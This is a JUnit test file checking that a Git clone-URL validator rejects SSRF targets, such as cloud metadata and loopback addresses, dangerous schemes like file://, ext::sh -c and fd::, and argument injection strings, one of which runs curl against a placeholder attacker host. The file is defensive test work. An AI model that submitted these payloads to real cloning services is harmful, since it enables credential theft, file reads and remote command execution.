package com.secretvault.repository;

import com.secretvault.repository.engine.GitCloneUrlValidator;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.junit.jupiter.api.Assertions.*;

@DisplayName("Repo Security: SSRF, Cloud Metadata & Dangerous Protocol Defense Suite")
class SsrfAndSandboxAttackTest {

    private final GitCloneUrlValidator urlValidator = new GitCloneUrlValidator();

    @Test
    @DisplayName("Valid public HTTPS clone URLs are accepted")
    void testValidHttpsCloneUrl() {
        assertDoesNotThrow(() ->
                urlValidator.validateCloneUrl("https://github.com/secretvault/securevault.git")
        );
        assertDoesNotThrow(() ->
                urlValidator.validateCloneUrl("https://gitlab.com/acme-corp/payment-worker.git")
        );
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "http://169.254.169.254/latest/meta-data/",
            "https://169.254.169.254/secrets",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://localhost:8080/repo.git",
            "http://127.0.0.1:9000/leaks.git",
            "http://0.0.0.0:8000/leaks.git",
            "http://[::1]:8080/leaks.git"
    })
    @DisplayName("SSRF Defense: Blocks cloud metadata and loopback host addresses")
    void testBlockCloudMetadataAndLoopback(String attackUrl) {
        assertThrows(SecurityException.class, () ->
                urlValidator.validateCloneUrl(attackUrl)
        );
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "file:///etc/passwd",
            "file://c:/windows/system32/cmd.exe",
            "ssh://git@github.com:secretvault/core.git",
            "git://github.com/secretvault/core.git",
            "ext::sh -c evil.sh",
            "fd::1"
    })
    @DisplayName("Protocol Defense: Blocks dangerous Git schemes (file://, ssh://, ext::, fd::)")
    void testBlockDangerousGitSchemes(String attackUrl) {
        assertThrows(SecurityException.class, () ->
                urlValidator.validateCloneUrl(attackUrl)
        );
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "--upload-pack=evil.sh",
            "-u `curl attacker.com`",
            "--config=core.gitProxy=evil.sh"
    })
    @DisplayName("Argument Injection: Blocks leading dashes in clone URLs")
    void testBlockArgumentInjection(String attackUrl) {
        assertThrows(SecurityException.class, () ->
                urlValidator.validateCloneUrl(attackUrl)
        );
    }

    @Test
    @DisplayName("Validation rejects null, empty or whitespace-only clone URLs")
    void testRejectNullOrEmpty() {
        assertThrows(IllegalArgumentException.class, () -> urlValidator.validateCloneUrl(null));
        assertThrows(IllegalArgumentException.class, () -> urlValidator.validateCloneUrl(""));
        assertThrows(IllegalArgumentException.class, () -> urlValidator.validateCloneUrl("   "));
    }
}
